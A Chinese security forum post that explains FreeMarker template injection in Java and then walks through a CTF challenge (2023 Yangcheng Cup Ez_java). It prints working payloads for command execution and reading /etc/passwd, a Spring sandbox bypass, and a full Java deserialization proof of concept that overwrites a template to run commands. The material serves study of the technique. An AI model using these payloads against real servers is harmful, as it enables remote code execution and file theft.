# Java安全 - FreeMarker模版注入浅析

> **来源**: https://forum.butian.net/share/2862  
> **文章ID**: 2862

---

前言
==

之前面试的时候问到一个很偏的问题，"请你说说Java的模版注入吧" 当时懵逼了一会儿答了FreeMarker和Thymeleaf以及Velocity，但是当时没有研究过只是知道有这三个玩意，今天刚好掏出半年前的题目来看下FreeMarker的模版注入吧

‍

‍

FreeMarker
==========

‍

### 什么是模版引擎

就是前端有个模板页面，然后通过"变量符/指令/插值"进行占位，后端查询回来的数据可以动态的向这些占位处填充实际数据

‍

### FreeMarker结构

- 文本
- 插值
- FTL标签
- 注释

​

### Freemarker配置

```xml
server.port=8888
# 模板后缀名
spring.freemarker.suffix=.ftl
# 文档类型
spring.freemarker.content-type=text/html
# 页面编码
spring.freemarker.charset=UTF-8
# 页面缓存
spring.freemarker.cache=false
# 模板路径
spring.freemarker.template-loader-path=classpath:/templates/
```

‍

### Freemarker模版

index.ftl

```xml

<html lang="zh">
<head>
<meta charset="UTF-8">
<title>Demo</title>
</head>
<body>
<table>
<tr>
<td>Zjacky</td>
</tr>
<tr>
<td>${username}</td>
<td>${password}</td>
</tr>
</table>
</body>
</html>
```

‍

### 内置函数危险使用

在模板引擎渲染模板时，如果模板中存在恶意代码，进而会在渲染时执行恶意代码。不同的模板触发漏洞的场景也不同

FreeMarker是存在api 和new的内建函数能够进行命令执行

‍

#### <span style="font-weight: bold;" data-type="strong">api</span>

‍

api 函数必须在配置项 `api_builtin_enabled`​ 为 `true`​ 时才有效，而该配置在2.3.22\*版本之后默认为 false

‍

我们可以通过 api 内建函数获取类的 classloader 然后加载恶意类，或者通过Class.getResource 的返回值来访问 URI 对象。 URI 对象包含 toURL 和 create 方法，我们通过这两个方法创建任意 URI ，然后用 toURL 访问任意URL

‍

```jsp
// 加载恶意类
<#assign classLoader=object?api.class.getClassLoader()>${classLoader.loadClass("Evil.class")}

// 读取任意文件
<#assign uri=object?api.class.getResource("/").toURI()>
  <#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>
  <#assign is=input?api.getInputStream()>
  FILE:[<#list 0..999999999 as _>
      <#assign byte=is.read()>
      <#if byte == -1>
          <#break>
      </#if>
  ${byte}, </#list>]
```

‍

#### <span style="font-weight: bold;" data-type="strong">new</span>

‍

主要是寻找实现了TemplateModel 接口的可利用类来进行实例化 <span style="font-weight: bold;" data-type="strong">。</span>​`freemarker.template.utility`​ 包中存在三个符合条件的类，分别为

- Execute 类

```jsp
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}
```

‍

- ObjectConstructor类

```jsp
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}
```

‍

- JythonRuntime 类

```jsp
<#assign value="freemarker.template.utility.JythonRuntime"?new()>${value("calc.exe")}<@value>import os;os.system("calc.exe")</@value>//@value为自定义标签
```

‍

‍

下面通过一个题来理解下Java的SSTI

2023 - 羊城杯 - Ez\_java​​
=======================

‍

考点：

1. Java动态代理
2. Java反序列化
3. Java - freemaker模板注入(绕过Spring沙箱)

‍

### 信息分析

打开依赖发现只有一个组件就是`freemaker`​

![image](images/attach-a1fd285d4d05930e041a4f272f0129079332c914.png)​

‍

而且题目也给了一个目录里面存在`ftl`​文件，所以很容易想到就是打`freemaker`​模版注入，那么看看怎么上传`ftl`​文件

‍

这里再看下配置文件发现用了Spring的一个内置沙箱来防止模版注入

具体可以参考https://www.cnblogs.com/escape-w/p/17326592.html

![image](images/attach-2337aeb1b4d39ce9c6320529cf263e003b21ef59.png)​

‍

先看文件目录

![image](images/attach-2f5b08a885a25926df76d5d54f853535612edb9b.png)​

‍

### 构造链

‍

可以看到有个upload类看下代码

![image](images/attach-85fd36f0150b15f76dae979f682c6dade1ce9f39.png)​

只能上传`.ftl`​文件，那就是想到覆盖`index.ftl`​文件了，往上看如何调用

于是找到`HtmlMap#get()`​方法，传`filename`​ `content`​属性

![image](images/attach-46f48d35090a4fe7b3507ed95e2296c39010d8f6.png)​

在往上跟谁调用了get方法找到`HtmlInvocationHandler#invoke()`​

![image](images/attach-478ffdf830423dd07c4d3957230a34fa98770fbc.png)​

这明显是一个代理类，存在invoke方法，在学习动态代理或者CC1的LazyMap的时候就知道这个`InvocationHandler`​就是动态代理的调用处理器，当使用代理对象的某个方法的 时候就会默认调用这个重写的`invoke`​方法，如下图

![image](images/attach-511fc8f5e71876c6015a6c2cd12a0868dfe4e06b.png)​

然后看控制器

![image](images/attach-f3d032eae6199df70715921eb4acebcf7a358a1f.png)​

发现`/templating`​触发`index.ftl`​

`/getflag`​ 直接裸字节流反序列化

‍

那么结合一下CC1的后半条链子，整条思路链就构造完毕了

```java
AnnotationInvocationHandler#readObject()->HtmlInvocationHandler#invoke()->HtmlMap#get()->HtmlUploadUtil#uploadfile()
```

‍

绕过沙箱的payload

```java
<#assign ac=springMacroRequestContext.webApplicationContext>
  <#assign fc=ac.getBean('freeMarkerConfiguration')>
    <#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()>
      <#assign VOID=fc.setNewBuiltinClassResolver(dcr)>${"freemarker.template.utility.Execute"?new()("id")}
```

‍

然后访问ssti templating?name=xxx即可打成功

最终EXP的思路为

1. 构造`htmlMap`​需要上传的属性`filename`​ 为`index.ftl`​ `content`​ 为恶意的SSTI payload
2. new一个`htmlMap`​的处理器包裹
3. CC1后半条链子，通过`AnnotationInvocationHandler`​触发动态代理的调用处理器

```java
package com.ycbjava;
import com.ycbjava.Utils.HtmlInvocationHandler;
import com.ycbjava.Utils.HtmlMap;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.lang.annotation.Target;
import java.util.Map;
public class YCBPoC {

    public static void main(String[] args) throws Exception {
        HtmlMap htmlMap = new HtmlMap();
        htmlMap.filename="index.ftl";
        htmlMap.content="<#assign ac=springMacroRequestContext.webApplicationContext>\n" +
                "  <#assign fc=ac.getBean('freeMarkerConfiguration')>\n" +
                "    <#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()>\n" +
                "      <#assign VOID=fc.setNewBuiltinClassResolver(dcr)>${\"freemarker.template.utility.Execute\"?new()(\"whoami\")}\n";
        HtmlInvocationHandler html = new HtmlInvocationHandler(htmlMap);
        Map proxy = (Map) Proxy.newProxyInstance(YCBPoC.class.getClassLoader(), new Class[] {Map.class}, html);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor a = c.getDeclaredConstructor(Class.class, Map.class);
        a.setAccessible(true);
        Object exp = a.newInstance(Target.class, proxy);
        System.out.println(serial(exp));
        deserial(serial(exp));

    }
    public static String serial(Object o) throws IOException, NoSuchFieldException {
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        ObjectOutputStream stream1 = new ObjectOutputStream(stream);
        stream1.writeObject(o);
        stream1.close();
        String base64String = Base64.getEncoder().encodeToString(stream.toByteArray());
        return base64String;

    }
    public static void deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream b = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream o = new ObjectInputStream(b);
        o.readObject();
        o.close();
    }
}
```

然后将结果打入

![image](images/attach-092b13b6e825293e3596fb49a53fbf44db41ba80.png)​

‍

然后去触发`index.ftl`​​即可执行命令![image](images/attach-40d91e6e485a85200fbb3af0fd4d814649cc44f4.png)​

‍
